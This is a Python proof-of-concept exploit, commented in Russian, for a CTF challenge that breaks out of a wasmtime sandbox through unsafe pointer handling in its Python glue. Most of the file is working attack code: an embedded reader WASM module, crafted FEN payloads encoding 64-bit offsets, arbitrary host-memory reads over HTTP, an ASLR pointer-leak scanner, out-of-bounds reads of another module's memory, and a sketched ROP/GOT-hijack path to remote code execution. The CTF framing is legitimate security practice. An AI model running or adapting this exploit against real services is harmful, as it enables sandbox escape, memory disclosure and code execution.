"""Goliath (Avito CTF 2026) — WASM-песочница ломается небезопасным embedder-glue.

Что делает:
    Сервис запускает загруженный участником `.wasm` в wasmtime БЕЗ импортов
    (`imports=[]`), но связующий Python читает/пишет линейную память модуля через
    СЫРОЙ `memory.data_ptr()` (ctypes-указатель), индексируя его значениями, что
    возвращают экспортируемые модулем `fen_buffer()`/`best_move()` — без проверки
    границ. Значит, вернув из этих экспортов i64-смещение, гость получает
    произвольные чтение/запись по адресному пространству хост-процесса CPython;
    результат чтения возвращается прямо в JSON `/api/best-move`.

Логика подхода (та же, что в §3 райтапа):
    1. Загружаем модуль-«читалку»: fen_buffer->16, best_move-> i64.load@20.
    2. Произвольное ОТНОСИТЕЛЬНОЕ чтение: FEN = "x b " + 8 байт офсета (LE);
       поле цвета остаётся 'b' -> выбирается наш BADGER; best_move возвращает
       строку по base+offset до первого \0. Знать `base` для этого не нужно.
    3. ASLR-лик: сканируем окно офсетов, ищем указателеподобные значения ->
       восстанавливаем абсолютный base/libc (target-specific; каркас ниже).
    4. RCE-финиш (arbitrary R/W -> ROP: open/read/write по /flag; root) —
       документированный каркас, под целевой Linux/glibc; на живом инстансе не
       гонялся (инстансы recaptcha-gated, 15 мин).

Живая проверка (2026-07-20, goliath-srv-wmm0wh1s):
    Полный конвейер «upload -> экспорт возвращает подконтрольный офсет ->
    хост разыменовывает base+offset -> байты уходят в JSON» ПОДТВЕРЖДЁН на
    боевом инстансе через публичный HTTP (не только локально через TestClient):
      - POST /api/upload читалки -> 200 {"status":"ok","bytes":83};
      - GET /api/best-move (offset 64, наша обнулённая память) -> 200
        {"best_move":""} — хост разыменовал base+64 и вернул содержимое;
      - GET /api/best-move (offset 0) -> 422 "no legal move" — ЛОВУШКА: при
        i64.load@20 == 0 экспорт best_move возвращает 0, и хост считает это
        «нет хода» (ptr==0 sentinel). При сканировании офсет 0 не использовать.
    Остаток до хостового /flag (шаги 4–6) упирается в ОДИН лик хостового
    указателя под ASLR; из безопасно достижимых ориентиров (наша линейная
    память; чужая линейная память BEE на k-слоте) хостовых указателей нет —
    там только 32-битные wasm-данные, а всё вокруг за PROT_NONE-гардами по
    плавающему офсету (см. §3 «зеркальная заметка», david §3.1). Безопасного
    лика нет => нужен crash-sweep, который сжигает 15-мин окно и рерандомизит k.

Без --url выполняется локальный self-check против немодифицированного
goliath/mcu-max.py через FastAPI TestClient (эквивалент work/exp3).

Зависимости: httpx (для --url) и wasmtime+fastapi (для локального self-check).
"""

from __future__ import annotations

import argparse
import pathlib
import urllib.parse

# Готовый модуль-«читалка» (83 байта), собранный из:
#   (module
#     (memory (export "memory") 1 100)
#     (func (export "fen_buffer") (result i32) (i32.const 16))
#     (func (export "best_move")  (result i64) (i64.load (i32.const 20))))
READER_WASM_HEX = (
    "0061736d010000000109026000017f6000017e0303020001050401010164072303"
    "066d656d6f727902000a66656e5f627566666572000009626573745f6d6f766500"
    "010a0e02040041100b070041142903000b"
)
READER_WASM = bytes.fromhex(READER_WASM_HEX)


def make_fen(offset: int) -> str:
    """FEN, задающий смещение чтения относительно базы линейной памяти.

    Args:
        offset: знаковое смещение от базы (target - base для абсолютного адреса).

    Returns:
        URL-энкодированную строку FEN вида "x b " + 8 байт офсета (little-endian).
    """
    off_u64 = offset & 0xFFFFFFFFFFFFFFFF
    raw = b"x b " + off_u64.to_bytes(8, "little")
    return urllib.parse.quote(raw.decode("latin-1"), safe="")


def read_rel(get_best_move, offset: int) -> bytes:
    """Прочитать null-terminated строку по base+offset через /api/best-move.

    Args:
        get_best_move: callable(fen_query) -> str (значение поля best_move).
        offset: знаковое смещение от базы линейной памяти.

    Returns:
        Прочитанные байты (до первого нулевого).
    """
    return get_best_move(make_fen(offset)).encode("latin-1")


def read_byte(get_best_move, offset: int) -> int:
    """Прочитать один байт по base+offset (пустой ответ == нулевой байт)."""
    data = read_rel(get_best_move, offset)
    return data[0] if data else 0


# --------------------------------------------------------------------------- #
# Ориентир BEE: чужая (встроенная) линейная память на решётке k·64 МиБ.
# Смещение к её `fen_buf` (in-module флаг): 0x104000000 + k·0x04000000 + 0x430.
# Живьём (david) для этого инстанса подтверждён k=2 -> 0x10c000430. ВНИМАНИЕ:
# промах по k = SIGSEGV (мягкой ошибки нет), поэтому это ОДИН выстрел за бут.
# --------------------------------------------------------------------------- #
BEE_RESERVATION = 0x104000000
BEE_GRID_STEP = 0x04000000
BEE_FEN_BUF_OFF = 0x430


def bee_fen_buf_offset(k: int) -> int:
    """Смещение до BEE.fen_buf для слота k (k∈{0,1,2}); промах по k = крэш."""
    return BEE_RESERVATION + k * BEE_GRID_STEP + BEE_FEN_BUF_OFF


# --------------------------------------------------------------------------- #
# Каркас ASLR-лика и RCE (§5, шаги 4–6). Target-specific: Linux x86-64/glibc.
# --------------------------------------------------------------------------- #
def leak_pointers(get_best_move, lo: int, hi: int, step: int = 8):
    """Просканировать окно офсетов и вернуть указателеподобные 8-байтные значения.

    ВНИМАНИЕ: чтение неотображённой памяти уронит сервис (SIGSEGV). На боевом
    инстансе окно подбирается осторожно (рядом с линейной памятью — рантайм
    wasmtime, где, в частности, лежит VMMemoryDefinition.base). Здесь — каркас.

    Args:
        get_best_move: callable(fen_query) -> str.
        lo: нижняя граница офсета (включительно).
        hi: верхняя граница офсета (исключительно).
        step: шаг сканирования.

    Yields:
        Пары (offset, qword) для значений, похожих на userspace-указатели.
    """
    for off in range(lo, hi, step):
        qword = int.from_bytes(bytes(read_byte(get_best_move, off + i) for i in range(8)), "little")
        if 0x0000_5000_0000_0000 <= qword <= 0x0000_7FFF_FFFF_FFFF:
            yield off, qword


def pwn_and_read_flag(get_best_move, upload) -> str:
    """Финиш arbitrary R/W -> RCE -> cat /flag (каркас, см. §5 шаги 5–6).

    План: (a) leak_pointers -> абсолютный base и база libc; (b) загрузить
    модуль-«писалку» (fen_buffer-> i64 из мутабельной глобали) и произвольной
    записью положить ROP-цепочку по стеку (адрес возврата ищем через libc
    `environ`), вызвать open("/flag")+read+write; либо GOT-hijack на system.
    Реализация зависит от версий на боевом хосте и здесь не разворачивается.
    """
    raise NotImplementedError(
        "RCE-финиш (§5 шаги 5–6) — target-specific ROP/GOT под Linux/glibc; "
        "см. райтап. Примитивы R/W подтверждены (exp1..3)."
    )


# --------------------------------------------------------------------------- #
# Драйверы: живой инстанс (--url) и локальный self-check (TestClient).
# --------------------------------------------------------------------------- #
def run_live(url: str, leak_bee_k: int | None = None) -> None:
    """Загрузить читалку и продемонстрировать произвольное чтение на инстансе.

    Args:
        url: базовый URL инстанса.
        leak_bee_k: если задан слот k∈{0,1,2} — попытаться прочитать BEE.fen_buf
            (in-module флаг) как реальное OOB-чтение чужой памяти. РИСК: промах
            по k = SIGSEGV -> рестарт контейнера -> рерандомизация k. По умолчанию
            None (только безопасная демонстрация конвейера, без риска крэша).
    """
    import httpx

    url = url.rstrip("/")
    with httpx.Client(timeout=30) as cli:
        r = cli.post(
            f"{url}/api/upload",
            files={"file": ("reader.wasm", READER_WASM, "application/wasm")},
        )
        print("[*] /api/upload ->", r.status_code, r.text)
        r.raise_for_status()

        def get_best_move(fen_query: str) -> str:
            resp = cli.get(f"{url}/api/best-move?fen={fen_query}")
            resp.raise_for_status()
            return resp.json().get("best_move", "")

        # БЕЗОПАСНО: читаем СВОЮ линейную память по in-bounds ненулевому офсету.
        # (offset 0 не годится: best_move()==0 -> хост отдаёт 422 ptr==0 sentinel.)
        dump = read_rel(get_best_move, 64)
        print(f"[+] SAFE self-read @ base+64: {dump[:32]!r} (обнулённая наша память)")
        print(
            "[+] LIVE OK: конвейер upload + произвольное относительное чтение "
            "подтверждён через реальный HTTP."
        )

        if leak_bee_k is None:
            print(
                "[i] дальше (риск крэша, --leak-bee): OOB-чтение BEE.fen_buf на "
                "k-слоте; затем leak_pointers -> base/libc -> pwn_and_read_flag."
            )
            return

        off = bee_fen_buf_offset(leak_bee_k)
        print(f"[!] OOB-чтение BEE.fen_buf @ base+{off:#x} (k={leak_bee_k}); промах по k = крэш")
        try:
            leaked = read_rel(get_best_move, off)
        except httpx.HTTPError as exc:
            print(f"[!] OOB-чтение упало (вероятно крэш/рестарт): {type(exc).__name__}: {exc}")
            return
        print(f"[+] BEE.fen_buf: {leaked!r}")


def run_local_selfcheck() -> None:
    """Проверить примитив против немодифицированного mcu-max.py (TestClient)."""
    import ctypes
    import importlib.util

    from fastapi.testclient import TestClient

    app_path = pathlib.Path(__file__).resolve().parent / "goliath" / "mcu-max.py"
    spec = importlib.util.spec_from_file_location("goliath_app", app_path)
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    client = TestClient(mod.APP)

    secret = b"AVITO_HOST_SECRET_selfcheck"
    obj = id(secret)
    win = bytes((ctypes.c_char * 64).from_address(obj))
    chars_addr = obj + win.find(secret)

    r = client.post("/api/upload", files={"file": ("reader.wasm", READER_WASM, "application/wasm")})
    print("[*] /api/upload ->", r.status_code, r.json())

    base = ctypes.addressof(mod.BADGER_PLAYER._Player__memory.contents)  # noqa: SLF001

    def get_best_move(fen_query: str) -> str:
        return client.get(f"/api/best-move?fen={fen_query}").json().get("best_move", "")

    leaked = read_rel(get_best_move, chars_addr - base)
    print(f"[+] leaked over API: {leaked!r}")
    assert leaked == secret, "self-check FAILED"
    print("[+] SELF-CHECK OK: произвольное чтение памяти хоста через реальный API.")


def main() -> None:
    """CLI-точка входа."""
    ap = argparse.ArgumentParser(description="Goliath WASM-escape PoC")
    ap.add_argument("--url", help="базовый URL инстанса (например https://host/)")
    ap.add_argument(
        "--leak-bee",
        type=int,
        choices=(0, 1, 2),
        default=None,
        metavar="K",
        help="РИСК КРЭША: OOB-чтение BEE.fen_buf на k-слоте (промах по k = SIGSEGV)",
    )
    args = ap.parse_args()
    if args.url:
        run_live(args.url, leak_bee_k=args.leak_bee)
    else:
        run_local_selfcheck()


if __name__ == "__main__":
    main()
